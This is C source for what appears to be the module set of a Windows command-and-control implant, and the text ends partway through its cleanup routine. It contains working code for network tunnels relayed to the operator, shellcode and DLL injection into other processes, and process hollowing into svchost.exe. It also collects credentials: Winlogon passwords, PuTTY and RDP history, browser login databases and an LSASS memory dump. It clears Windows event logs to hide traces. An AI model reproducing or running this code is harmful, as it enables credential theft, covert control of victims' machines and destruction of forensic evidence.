#include "modules.h"
#include "util.h"

/* =========================================================================
 * Lifecycle
 * ========================================================================= */
void tunnels_init(void);
void tunnels_closeall(void);
void c2_config_set(config_t *cfg);

void c2_modules_init(config_t *cfg)
{
    c2_config_set(cfg);
    tunnels_init();
    keylog_init();
}

void c2_modules_fini(void)
{
    buf_t dummy;
    buf_init(&dummy);
    mod_keylog_stop(NULL, &dummy);
    buf_free(&dummy);
    tunnels_closeall();
}

/* =========================================================================
 * TCP tunnels (client-initiated forward tunnels, relayed through TUNNEL_DATA)
 * ========================================================================= */
typedef struct tunnel {
    u32             tid;
    SOCKET          s;
    volatile LONG   active;
    HANDLE          th;
    struct tunnel  *next;
} tunnel_t;

static tunnel_t        *g_tunnels = NULL;
static CRITICAL_SECTION g_tun_cs;
static int              g_tun_cs_init = 0;

void tunnels_init(void)
{
    if (!g_tun_cs_init) {
        InitializeCriticalSection(&g_tun_cs);
        g_tun_cs_init = 1;
    }
}

static tunnel_t *tun_find(u32 tid)
{
    tunnel_t *t;
    if (!g_tun_cs_init) return NULL;
    EnterCriticalSection(&g_tun_cs);
    for (t = g_tunnels; t; t = t->next) {
        if (t->tid == tid) { LeaveCriticalSection(&g_tun_cs); return t; }
    }
    LeaveCriticalSection(&g_tun_cs);
    return NULL;
}

static void tun_unlink(tunnel_t *node)
{
    tunnel_t **pp;
    if (!node || !g_tun_cs_init) return;
    EnterCriticalSection(&g_tun_cs);
    for (pp = &g_tunnels; *pp; pp = &(*pp)->next) {
        if (*pp == node) { *pp = node->next; break; }
    }
    LeaveCriticalSection(&g_tun_cs);
}

static SOCKET tcp_connect_simple(const char *host, int port, int timeout_ms)
{
    struct addrinfo hints, *res = NULL, *p;
    char portstr[16];
    SOCKET result = INVALID_SOCKET;
    snprintf(portstr, sizeof(portstr), "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return INVALID_SOCKET;
    for (p = res; p; p = p->ai_next) {
        SOCKET s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        int connected = 0;
        if (s == INVALID_SOCKET) continue;
        {
            u_long nb = 1;
            ioctlsocket(s, FIONBIO, &nb);
            if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) connected = 1;
            else if (WSAGetLastError() == WSAEWOULDBLOCK) {
                fd_set wf;
                struct timeval tv;
                FD_ZERO(&wf);
                FD_SET(s, &wf);
                tv.tv_sec = timeout_ms / 1000;
                tv.tv_usec = (timeout_ms % 1000) * 1000;
                if (select(0, NULL, &wf, NULL, &tv) > 0) {
                    int soerr = 0, sl = (int)sizeof(soerr);
                    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&soerr, &sl) == 0 && soerr == 0) connected = 1;
                }
            }
            nb = 0;
            ioctlsocket(s, FIONBIO, &nb);
        }
        if (connected) {
            DWORD tv_recv = 500;
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv_recv, sizeof(tv_recv));
            result = s;
            break;
        }
        closesocket(s);
    }
    freeaddrinfo(res);
    return result;
}

static DWORD WINAPI tunnel_thread(LPVOID param)
{
    tunnel_t *t = (tunnel_t *)param;
    u8 buf[8192];
    for (;;) {
        int r;
        if (InterlockedCompareExchange(&t->active, 1, 1) == 0) break;
        r = recv(t->s, (char *)buf, sizeof(buf), 0);
        if (r <= 0) {
            int e = WSAGetLastError();
            if (e == WSAETIMEDOUT || e == WSAEWOULDBLOCK) continue;
            break;
        }
        {
            u8 *msg = (u8 *)xmalloc((size_t)r + 4);
            msg[0] = (u8)(t->tid >> 24); msg[1] = (u8)(t->tid >> 16);
            msg[2] = (u8)(t->tid >> 8);  msg[3] = (u8)t->tid;
            memcpy(msg + 4, buf, (size_t)r);
            c2_post(MSG_TUNNEL_DATA, msg, (size_t)r + 4);
            free(msg);
        }
    }
    {
        u8 msg[4];
        msg[0] = (u8)(t->tid >> 24); msg[1] = (u8)(t->tid >> 16);
        msg[2] = (u8)(t->tid >> 8);  msg[3] = (u8)t->tid;
        c2_post(MSG_TUNNEL_CLOSE, msg, 4);
    }
    InterlockedExchange(&t->active, 0);
    return 0;
}

int mod_tunnel_open(const json *args, buf_t *out)
{
    u32 tid = (u32)json_obj_int(args, "tid", 0);
    const char *host = json_obj_str(args, "host", NULL);
    int port = (int)json_obj_int(args, "port", 0);
    tunnel_t *t;
    if (!host || !*host || port <= 0 || port > 65535) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad args\"}");
        return -1;
    }
    if (!g_tun_cs_init) tunnels_init();
    if (tun_find(tid)) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"tid already open\"}");
        return -1;
    }
    t = (tunnel_t *)xcalloc(1, sizeof(*t));
    t->tid = tid;
    t->s = tcp_connect_simple(host, port, 10000);
    if (t->s == INVALID_SOCKET) {
        free(t);
        buf_append_str(out, "{\"ok\":false,\"error\":\"connect failed\"}");
        return -1;
    }
    t->active = 1;
    t->th = CreateThread(NULL, 0, tunnel_thread, t, 0, NULL);
    EnterCriticalSection(&g_tun_cs);
    t->next = g_tunnels;
    g_tunnels = t;
    LeaveCriticalSection(&g_tun_cs);
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jint(out, "tid", (long long)tid);
    buf_append_str(out, "}");
    return 0;
}

int mod_tunnel_data(const json *args, buf_t *out)
{
    u32 tid = (u32)json_obj_int(args, "tid", 0);
    const char *b64 = json_obj_str(args, "data_b64", NULL);
    tunnel_t *t = tun_find(tid);
    u8 *data = NULL;
    size_t n = 0;
    int rc;
    if (!t || !b64) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"no tunnel or data\"}");
        return -1;
    }
    if (b64_dec(b64, &data, &n) != 0) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad base64\"}");
        return -1;
    }
    rc = 0;
    {
        size_t off = 0;
        while (off < n) {
            int w = send(t->s, (const char *)data + off, (int)(n - off), 0);
            if (w <= 0) { rc = -1; break; }
            off += (size_t)w;
        }
    }
    free(data);
    buf_append_str(out, "{"); jbool(out, "ok", rc == 0); buf_append_str(out, ",");
    jint(out, "written", (long long)n); buf_append_str(out, "}");
    return rc;
}

static void tunnel_teardown(tunnel_t *t)
{
    if (!t) return;
    InterlockedExchange(&t->active, 0);
    if (t->s != INVALID_SOCKET) {
        closesocket(t->s);
        t->s = INVALID_SOCKET;
    }
    if (t->th) {
        WaitForSingleObject(t->th, 3000);
        CloseHandle(t->th);
        t->th = NULL;
    }
    tun_unlink(t);
    free(t);
}

int mod_tunnel_close(const json *args, buf_t *out)
{
    u32 tid = (u32)json_obj_int(args, "tid", 0);
    tunnel_t *t = tun_find(tid);
    if (t) tunnel_teardown(t);
    buf_append_str(out, "{"); jbool(out, "ok", 1); buf_append_str(out, ",");
    jint(out, "tid", (long long)tid); buf_append_str(out, "}");
    return 0;
}

void tunnels_closeall(void)
{
    tunnel_t *t;
    if (!g_tun_cs_init) return;
    EnterCriticalSection(&g_tun_cs);
    t = g_tunnels;
    g_tunnels = NULL;
    LeaveCriticalSection(&g_tun_cs);
    while (t) {
        tunnel_t *next = t->next;
        t->next = NULL;
        tunnel_teardown(t);
        t = next;
    }
}

/* =========================================================================
 * Privilege / process injection
 * ========================================================================= */
static int enable_priv(const wchar_t *name)
{
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    int ok = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return 0;
    if (LookupPrivilegeValueW(NULL, name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL) ? 1 : 0;
    }
    CloseHandle(tok);
    return ok;
}

static HANDLE open_target(int pid)
{
    return OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
                       PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, (DWORD)pid);
}

int mod_inject(const json *args, buf_t *out)
{
    int pid = (int)json_obj_int(args, "pid", 0);
    const char *b64 = json_obj_str(args, "shellcode_b64", NULL);
    const char *method = json_obj_str(args, "method", "crt");
    u8 *sc = NULL;
    size_t n = 0;
    HANDLE proc;
    void *mem;
    SIZE_T wr = 0;
    int rc = -1;
    if (pid <= 0 || !b64) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad args\"}");
        return -1;
    }
    if (b64_dec(b64, &sc, &n) != 0 || n == 0) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad shellcode\"}");
        return -1;
    }
    enable_priv(L"SeDebugPrivilege");
    proc = open_target(pid);
    if (!proc) {
        free(sc);
        buf_append_str(out, "{\"ok\":false,\"error\":\"open process failed\"}");
        return -1;
    }
    mem = VirtualAllocEx(proc, NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        CloseHandle(proc); free(sc);
        buf_append_str(out, "{\"ok\":false,\"error\":\"VirtualAllocEx failed\"}");
        return -1;
    }
    if (!WriteProcessMemory(proc, mem, sc, n, &wr) || wr != n) {
        CloseHandle(proc); free(sc);
        buf_append_str(out, "{\"ok\":false,\"error\":\"WriteProcessMemory failed\"}");
        return -1;
    }
    if (!_stricmp(method, "apc")) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        int queued = 0;
        if (snap != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te;
            te.dwSize = sizeof(te);
            if (Thread32First(snap, &te)) {
                do {
                    if ((int)te.th32OwnerProcessID == pid) {
                        HANDLE th = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                        if (th) {
                            if (QueueUserAPC((PAPCFUNC)mem, th, 0)) queued++;
                            CloseHandle(th);
                        }
                    }
                } while (Thread32Next(snap, &te));
            }
            CloseHandle(snap);
        }
        rc = queued > 0 ? 0 : -1;
        buf_append_str(out, "{");
        jbool(out, "ok", rc == 0);
        buf_append_str(out, ","); jstr(out, "method", "apc");
        buf_append_str(out, ","); jint(out, "threads", queued);
        buf_append_str(out, ","); jint(out, "bytes", (long long)n);
        buf_append_str(out, "}");
    } else {
        HANDLE th = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        rc = th ? 0 : -1;
        if (th) CloseHandle(th);
        buf_append_str(out, "{");
        jbool(out, "ok", rc == 0);
        buf_append_str(out, ","); jstr(out, "method", "crt");
        buf_append_str(out, ","); jint(out, "bytes", (long long)n);
        buf_append_str(out, "}");
    }
    CloseHandle(proc);
    free(sc);
    return rc;
}

int mod_inject_dll(const json *args, buf_t *out)
{
    int pid = (int)json_obj_int(args, "pid", 0);
    const char *dll = json_obj_str(args, "dll", NULL);
    wchar_t *wdll;
    size_t bytes;
    HANDLE proc;
    void *mem;
    FARPROC loadlib;
    HANDLE th;
    int rc = -1;
    if (pid <= 0 || !dll || !*dll) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad args\"}");
        return -1;
    }
    wdll = widen(dll);
    if (!wdll) return -1;
    bytes = (wcslen(wdll) + 1) * sizeof(wchar_t);
    enable_priv(L"SeDebugPrivilege");
    proc = open_target(pid);
    if (!proc) {
        free(wdll);
        buf_append_str(out, "{\"ok\":false,\"error\":\"open process failed\"}");
        return -1;
    }
    mem = VirtualAllocEx(proc, NULL, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        CloseHandle(proc); free(wdll);
        buf_append_str(out, "{\"ok\":false,\"error\":\"VirtualAllocEx failed\"}");
        return -1;
    }
    if (!WriteProcessMemory(proc, mem, wdll, bytes, NULL)) {
        CloseHandle(proc); free(wdll);
        buf_append_str(out, "{\"ok\":false,\"error\":\"WriteProcessMemory failed\"}");
        return -1;
    }
    loadlib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    th = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, mem, 0, NULL);
    if (th) { rc = 0; CloseHandle(th); }
    CloseHandle(proc);
    free(wdll);
    buf_append_str(out, "{");
    jbool(out, "ok", rc == 0);
    buf_append_str(out, ","); jint(out, "pid", pid);
    buf_append_str(out, "}");
    return rc;
}

/* ---- process hollowing / migration (x64 only) ---- */
#ifdef _WIN64
typedef LONG(NTAPI *nt_unmap_fn)(HANDLE, PVOID);

static int self_hollow(const wchar_t *target, char *err, size_t errcap)
{
    buf_t img;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_SECTION_HEADER *sec;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    ULONGLONG image_base = 0;
    void *base = NULL;
    HMODULE ntdll;
    nt_unmap_fn unmap;
    SIZE_T wr = 0;
    char *self;
    wchar_t cmdline[1024];
    int i;

    buf_init(&img);
    self = exe_path();
    if (!self || read_file(self, &img) != 0) {
        snprintf(err, errcap, "cannot read self image");
        free(self);
        buf_free(&img);
        return -1;
    }
    free(self);
    if (img.len < sizeof(IMAGE_DOS_HEADER)) { snprintf(err, errcap, "image too small"); buf_free(&img); return -1; }
    dos = (IMAGE_DOS_HEADER *)img.data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { snprintf(err, errcap, "bad MZ"); buf_free(&img); return -1; }
    nt = (IMAGE_NT_HEADERS64 *)(img.data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        snprintf(err, errcap, "not a x64 PE");
        buf_free(&img);
        return -1;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    wcsncpy(cmdline, target, 1023);
    cmdline[1023] = 0;
    if (!CreateProcessW((LPWSTR)target, cmdline, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        snprintf(err, errcap, "CreateProcessW failed %lu", (unsigned long)GetLastError());
        buf_free(&img);
        return -1;
    }
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        snprintf(err, errcap, "GetThreadContext failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        buf_free(&img);
        return -1;
    }
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &image_base, sizeof(image_base), NULL);
    ntdll = GetModuleHandleW(L"ntdll.dll");
    unmap = ntdll ? (nt_unmap_fn)GetProcAddress(ntdll, "NtUnmapViewOfSection") : NULL;
    if (unmap && image_base) unmap(pi.hProcess, (PVOID)image_base);
    base = VirtualAllocEx(pi.hProcess, (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                          nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
    if (!base || (ULONGLONG)(ULONG_PTR)base != nt->OptionalHeader.ImageBase) {
        snprintf(err, errcap, "VirtualAllocEx at preferred base failed (%p want %llx)", base,
                 (unsigned long long)nt->OptionalHeader.ImageBase);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        buf_free(&img);
        return -1;
    }
    WriteProcessMemory(pi.hProcess, base, img.data, nt->OptionalHeader.SizeOfHeaders, &wr);
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < (int)nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        WriteProcessMemory(pi.hProcess, (u8 *)base + sec->VirtualAddress,
                           img.data + sec->PointerToRawData, sec->SizeOfRawData, &wr);
    }
    ctx.Rip = (DWORD64)(ULONG_PTR)base + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    buf_free(&img);
    return 0;
}
#endif

int mod_migrate(const json *args, buf_t *out)
{
    const char *target = json_obj_str(args, "target", "C:\\Windows\\System32\\svchost.exe");
#ifndef _WIN64
    buf_append_str(out, "{\"ok\":false,\"error\":\"x64 build required\"}");
    return -1;
#else
    wchar_t *wt;
    char err[256] = {0};
    int rc;
    if (!target || !*target) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad target\"}");
        return -1;
    }
    wt = widen(target);
    if (!wt) return -1;
    enable_priv(L"SeDebugPrivilege");
    rc = self_hollow(wt, err, sizeof(err));
    free(wt);
    buf_append_str(out, "{");
    jbool(out, "ok", rc == 0);
    buf_append_str(out, ","); jstr(out, "target", target);
    buf_append_str(out, ","); jstr(out, "error", err);
    buf_append_str(out, "}");
    return rc;
#endif
}

/* =========================================================================
 * Credential collection
 * ========================================================================= */
static int reg_get_sz2(HKEY root, const wchar_t *sub, const wchar_t *name, char *out, size_t cap)
{
    HKEY k;
    DWORD type = 0, sz = 0;
    wchar_t buf[1024];
    out[0] = 0;
    if (RegOpenKeyExW(root, sub, 0, KEY_READ, &k) != ERROR_SUCCESS) return -1;
    sz = (DWORD)(sizeof(buf) - sizeof(wchar_t));
    if (RegQueryValueExW(k, name, NULL, &type, (BYTE *)buf, &sz) != ERROR_SUCCESS ||
        (type != REG_SZ && type != REG_EXPAND_SZ)) {
        RegCloseKey(k);
        return -1;
    }
    buf[sz / sizeof(wchar_t)] = 0;
    {
        char *t = narrow(buf);
        snprintf(out, cap, "%s", t ? t : "");
        free(t);
    }
    RegCloseKey(k);
    return 0;
}

static void enum_key_values(HKEY root, const wchar_t *sub, buf_t *arr, int max)
{
    HKEY k;
    DWORD idx = 0;
    int first = 1;
    if (RegOpenKeyExW(root, sub, 0, KEY_READ, &k) != ERROR_SUCCESS) {
        buf_append_str(arr, "[]");
        return;
    }
    buf_append_str(arr, "[");
    for (;;) {
        wchar_t name[512];
        DWORD nlen = 512, type = 0, dsz = 0;
        LONG r;
        if (idx >= (DWORD)max) break;
        nlen = 512;
        r = RegEnumValueW(k, idx, name, &nlen, NULL, &type, NULL, &dsz);
        if (r != ERROR_SUCCESS) break;
        if (type == REG_SZ || type == REG_EXPAND_SZ) {
            wchar_t *val = (wchar_t *)xcalloc(dsz + 2, 1);
            DWORD vsz = dsz + 2;
            if (RegEnumValueW(k, idx, name, &nlen, NULL, &type, (BYTE *)val, &vsz) == ERROR_SUCCESS) {
                char *vn = narrow(name);
                char *vv = narrow(val);
                if (!first) buf_append_str(arr, ",");
                first = 0;
                buf_append_str(arr, "{");
                jstr(arr, "name", vn ? vn : "");
                buf_append_str(arr, ",");
                jstr(arr, "value", vv ? vv : "");
                buf_append_str(arr, "}");
                free(vn); free(vv);
            }
            free(val);
        }
        idx++;
    }
    buf_append_str(arr, "]");
    RegCloseKey(k);
}

static void enum_putty(buf_t *arr)
{
    HKEY k;
    DWORD idx = 0;
    int first = 1;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\SimonTatham\\PuTTY\\Sessions", 0, KEY_READ, &k) != ERROR_SUCCESS) {
        buf_append_str(arr, "[]");
        return;
    }
    buf_append_str(arr, "[");
    for (;;) {
        wchar_t sub[512];
        DWORD nlen = 512;
        HKEY sk;
        if (idx >= 200) break;
        if (RegEnumKeyExW(k, idx, sub, &nlen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        if (RegOpenKeyExW(k, sub, 0, KEY_READ, &sk) == ERROR_SUCCESS) {
            char host[256], user[256], port[64];
            reg_get_sz2(sk, L"", L"HostName", host, sizeof(host));
            reg_get_sz2(sk, L"", L"UserName", user, sizeof(user));
            reg_get_sz2(sk, L"", L"PortNumber", port, sizeof(port));
            if (host[0] || user[0]) {
                char *sn = narrow(sub);
                if (!first) buf_append_str(arr, ",");
                first = 0;
                buf_append_str(arr, "{"); jstr(arr, "session", sn ? sn : "");
                buf_append_str(arr, ","); jstr(arr, "host", host);
                buf_append_str(arr, ","); jstr(arr, "user", user);
                buf_append_str(arr, ","); jstr(arr, "port", port);
                buf_append_str(arr, "}");
                free(sn);
            }
            RegCloseKey(sk);
        }
        idx++;
    }
    buf_append_str(arr, "]");
    RegCloseKey(k);
}

static void enum_dir_files(const char *dir, buf_t *arr, int max)
{
    char pattern[MAX_PATH * 2];
    wchar_t *wp;
    WIN32_FIND_DATAW fd;
    HANDLE h;
    int first = 1;
    int n = 0;
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    wp = widen(pattern);
    buf_append_str(arr, "[");
    if (wp && (h = FindFirstFileW(wp, &fd)) != INVALID_HANDLE_VALUE) {
        do {
            char *nm;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            if (!first) buf_append_str(arr, ",");
            first = 0;
            nm = narrow(fd.cFileName);
            buf_append_str(arr, "{"); jstr(arr, "name", nm ? nm : "");
            buf_append_str(arr, ","); jint(arr, "size", (long long)(((u64)fd.nFileSizeHigh << 32) | fd.nFileSizeLow));
            buf_append_str(arr, ","); jstr(arr, "dir", dir);
            buf_append_str(arr, "}");
            free(nm);
            n++;
        } while (FindNextFileW(h, &fd) && n < max);
        FindClose(h);
    }
    if (wp) free(wp);
    buf_append_str(arr, "]");
}

static void dump_lsass(buf_t *out)
{
    HANDLE snap;
    PROCESSENTRY32W pe;
    DWORD pid = 0;
    HANDLE proc;
    char *tmp;
    char path[MAX_PATH * 2];
    char rnd[17];
    HMODULE dbg;
    typedef BOOL(WINAPI *minidump_fn)(HANDLE, DWORD, HANDLE, int, PVOID, PVOID, PVOID);
    minidump_fn dumpfn;
    HANDLE fh;

    enable_priv(L"SeDebugPrivilege");
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, L"lsass.exe")) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!pid) { buf_append_str(out, "{\"ok\":false,\"error\":\"lsass not found\"}"); return; }
    proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!proc) { buf_append_str(out, "{\"ok\":false,\"error\":\"open lsass failed\"}"); return; }
    tmp = env_dup("TEMP");
    rand_hex(rnd, 8);
    snprintf(path, sizeof(path), "%s\\lsass_%s.dmp", tmp ? tmp : ".", rnd);
    free(tmp);
    dbg = LoadLibraryW(L"dbghelp.dll");
    dumpfn = dbg ? (minidump_fn)GetProcAddress(dbg, "MiniDumpWriteDump") : NULL;
    if (!dumpfn) {
        CloseHandle(proc);
        buf_append_str(out, "{\"ok\":false,\"error\":\"dbghelp unavailable\"}");
        return;
    }
    fh = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
        CloseHandle(proc);
        buf_append_str(out, "{\"ok\":false,\"error\":\"create dump file failed\"}");
        return;
    }
    if (dumpfn(proc, pid, fh, 0x2, NULL, NULL, NULL)) {
        buf_append_str(out, "{");
        jbool(out, "ok", 1);
        buf_append_str(out, ","); jstr(out, "path", path);
        buf_append_str(out, "}");
    } else {
        buf_append_str(out, "{\"ok\":false,\"error\":\"MiniDumpWriteDump failed\"}");
    }
    CloseHandle(fh);
    CloseHandle(proc);
}

int mod_creds(const json *args, buf_t *out)
{
    int want_lsass = json_obj_bool(args, "lsass", 0);
    const char *outpath = json_obj_str(args, "save_summary", NULL);
    buf_t cmdout;
    char *appdata, *localappdata;
    char dir[MAX_PATH * 2];

    buf_append_str(out, "{");
    jbool(out, "ok", 1);

    buf_init(&cmdout);
    run_cmd("whoami /all", &cmdout, 30000, NULL);
    if (cmdout.len > 262144) cmdout.len = 262144;
    {
        char *b64 = b64_enc(cmdout.data, cmdout.len);
        buf_append_str(out, ","); jstr(out, "whoami_b64", b64 ? b64 : "");
        free(b64);
    }
    buf_reset(&cmdout);
    run_cmd("cmdkey /list", &cmdout, 20000, NULL);
    if (cmdout.len > 262144) cmdout.len = 262144;
    {
        char *b64 = b64_enc(cmdout.data, cmdout.len);
        buf_append_str(out, ","); jstr(out, "cmdkey_b64", b64 ? b64 : "");
        free(b64);
    }
    buf_free(&cmdout);

    {
        char u[256], p[256], d[256], a[64];
        reg_get_sz2(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"DefaultUserName", u, sizeof(u));
        reg_get_sz2(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"DefaultPassword", p, sizeof(p));
        reg_get_sz2(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"DefaultDomainName", d, sizeof(d));
        reg_get_sz2(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"AutoAdminLogon", a, sizeof(a));
        buf_append_str(out, ",\"winlogon\":{");
        jstr(out, "user", u);
        buf_append_str(out, ","); jstr(out, "password", p);
        buf_append_str(out, ","); jstr(out, "domain", d);
        buf_append_str(out, ","); jstr(out, "autologon", a);
        buf_append_str(out, "}");
    }

    buf_append_str(out, ",\"rdp_mru\":");
    {
        buf_t arr;
        buf_init(&arr);
        enum_key_values(HKEY_CURRENT_USER, L"Software\\Microsoft\\Terminal Server Client\\Default", &arr, 64);
        buf_append(out, arr.data, arr.len);
        buf_free(&arr);
    }

    buf_append_str(out, ",\"putty\":");
    {
        buf_t arr;
        buf_init(&arr);
        enum_putty(&arr);
        buf_append(out, arr.data, arr.len);
        buf_free(&arr);
    }

    appdata = env_dup("APPDATA");
    localappdata = env_dup("LOCALAPPDATA");
    buf_append_str(out, ",\"credential_files\":");
    {
        buf_t arr;
        buf_init(&arr);
        buf_append_str(&arr, "{");
        if (appdata) {
            snprintf(dir, sizeof(dir), "%s\\Microsoft\\Credentials", appdata);
            jkey(&arr, "roaming");
            enum_dir_files(dir, &arr, 200);
            buf_append_str(&arr, ",");
        }
        if (localappdata) {
            snprintf(dir, sizeof(dir), "%s\\Microsoft\\Credentials", localappdata);
            jkey(&arr, "local");
            enum_dir_files(dir, &arr, 200);
        }
        buf_append_str(&arr, "}");
        buf_append(out, arr.data, arr.len);
        buf_free(&arr);
    }

    buf_append_str(out, ",\"browser_db\":[");
    {
        const char *paths[4];
        int i;
        int firstb = 1;
        char tmpp[MAX_PATH * 2];
        paths[0] = "%s\\Google\\Chrome\\User Data\\Default\\Login Data";
        paths[1] = "%s\\Google\\Chrome\\User Data\\Local State";
        paths[2] = "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        paths[3] = "%s\\Microsoft\\Edge\\User Data\\Local State";
        for (i = 0; i < 4; i++) {
            if (!localappdata) continue;
            snprintf(tmpp, sizeof(tmpp), paths[i], localappdata);
            if (path_exists(tmpp)) {
                if (!firstb) buf_append_str(out, ",");
                firstb = 0;
                buf_append_str(out, "{");
                jstr(out, "path", tmpp);
                buf_append_str(out, ","); jbool(out, "exists", 1);
                buf_append_str(out, "}");
            }
        }
    }
    buf_append_str(out, "]");

    buf_append_str(out, ",\"env\":{");
    {
        const char *vars[] = { "USERNAME", "USERDOMAIN", "COMPUTERNAME", "LOGONSERVER", "USERPROFILE" };
        size_t i;
        for (i = 0; i < sizeof(vars) / sizeof(vars[0]); i++) {
            char *v = env_dup(vars[i]);
            if (i) buf_append_str(out, ",");
            jstr(out, vars[i], v ? v : "");
            free(v);
        }
    }
    buf_append_str(out, "}");

    if (want_lsass) {
        buf_append_str(out, ",\"lsass\":");
        dump_lsass(out);
    }
    buf_append_str(out, "}");

    if (outpath) write_file(outpath, out->data, out->len, 0);
    free(appdata);
    free(localappdata);
    return 0;
}

/* =========================================================================
 * Cleanup / timestomp / self-destruct
 * ========================================================================= */
static void wipe_file(const char *path)
{
    DeleteFileA(path);
}

static void wipe_dir_tree(const char *dir)
{
    char cmd[MAX_PATH * 3];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c rd /s /q \"%s\"", dir);
    run_cmd(cmd, NULL, 20000, NULL);
}

int mod_cleanup(const json *args, buf_t *out)
{
    int do_logs = json_obj_bool(args, "logs", 0);
    int do_artifacts = json_obj_bool(args, "artifacts", 1);
    int do_time = json_obj_bool(args, "timestomp", 1);
    char *tmp = env_dup("TEMP");
    char path[MAX_PATH * 2];
    int first = 1;

    buf_append_str(out, "{\"ok\":true,\"done\":[");
    if (do_logs) {
        const char *logs[] = { "Application", "System", "Security" };
        size_t i;
        for (i = 0; i < sizeof(logs) / sizeof(logs[0]); i++) {
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "wevtutil cl %s", logs[i]);
            run_cmd(cmd, NULL, 20000, NULL);
        }
        if (!first) buf_append_str(out, ","); first = 0;
        buf_append_str(out, "\"eventlogs\"");
    }
    if (do_artifacts) {
        if (tmp) {
            WIN32_FIND_DATAA fd;
            HANDLE h;
            snprintf(path, sizeof(path), "%s\\lsass_*.dmp", tmp);
            h = FindFirstFileA(path, &fd);
            if (h != INVALID_HANDLE_VALUE) {
                do {
                    char full[MAX_PATH * 2];
                    snprintf(full, sizeof(full), "%s\\%s", tmp, fd.cFileName);
                    wipe_file(full);
